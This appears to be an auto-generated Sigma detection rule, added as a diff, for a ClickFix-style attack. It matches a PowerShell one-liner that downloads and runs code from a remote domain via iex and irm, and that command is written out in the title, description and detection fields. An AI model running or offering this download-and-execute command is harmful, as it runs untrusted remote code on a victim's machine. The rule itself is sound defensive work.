@@ -1,0 +1,52 @@
+title: 'Command the source shows being run: powershell Write-Host(&{iex(irm(''elxxvvx.xyz/f''))})2>$null'
+id: 686ca500-8a87-4e02-8b64-dd055518c4ca
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "powershell "Write-Host(&{iex(irm(''elxxvvx.xyz/f''))})2>$null"
+  ``` ![HTML source of the Windows version of the page, with".'
+references:
+- https://www.manifold.security/blog/third-party-com-placeholder-clickfix
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-12'
+tags:
+- attack.t1059.001
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \powershell.exe
+    CommandLine|contains: Write-Host(&{iex(irm('elxxvvx.xyz/f'))})2>$null
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hecate_provenance:
+- value: elxxvvx.xyz
+  type: domain
+  role: download
+  status: historical
+  confidence: unknown
+  source: https://www.manifold.security/blog/third-party-com-placeholder-clickfix
+  evidence: The second-stage domain the command reaches out to, elxxvvx[.]xyz, was offline at the time
+    of our testing.
+- value: http://elxxvvx.xyz/f
+  type: url
+  role: unknown
+  status: unknown
+  confidence: unknown
+  source: cti
+- value: http://elxxvvx.xyz/f'
+  type: url
+  role: unknown
+  status: unknown
+  confidence: unknown
+  source: cti
+- value: elxxvvx.xyz/f
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.manifold.security/blog/third-party-com-placeholder-clickfix
+  evidence: Second stage elxxvvx[.]xyz/f (remote PowerShell, fetched via irm)
+hunt_id: H-0727
